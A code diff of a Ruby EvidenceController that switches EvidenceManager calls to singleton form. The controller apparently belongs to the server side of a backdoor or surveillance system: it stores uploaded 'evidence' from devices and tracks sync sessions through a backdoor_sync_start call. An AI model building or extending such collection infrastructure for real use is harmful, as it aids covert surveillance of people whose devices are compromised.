@@ -41,7 +41,7 @@ class EvidenceController < RESTController
 
     # save the evidence in the db
     begin
-      id = EvidenceManager.store_evidence session, @req_content.size, @req_content
+      id = EvidenceManager.instance.store_evidence session, @req_content.size, @req_content
       # notify the worker
       trace :info, "Evidence saved. Notifying worker of [#{session[:instance]}][#{id}]"
       notification = {session[:instance] => [id]}.to_json
@@ -68,7 +68,7 @@ class EvidenceController < RESTController
     time = Time.at(params['sync_time']).getutc
     
     # store the status
-    EvidenceManager.sync_start session, params['version'], params['user'], params['device'], params['source'], time.to_i, key
+    EvidenceManager.instance.sync_start session, params['version'], params['user'], params['device'], params['source'], time.to_i, key
 
     # update db with sync status
     DB.instance.backdoor_sync_start session[:bid], time, params['user'], params['device'], params['source']
@@ -84,7 +84,7 @@ class EvidenceController < RESTController
     session = params.symbolize
 
     # store the status
-    EvidenceManager.sync_end session
+    EvidenceManager.instance.sync_end session
 
     return STATUS_OK
   end
@@ -97,7 +97,7 @@ class EvidenceController < RESTController
     session = params.symbolize
 
     # store the status
-    EvidenceManager.sync_timeout session
+    EvidenceManager.instance.sync_timeout session
 
     return STATUS_OK
   end
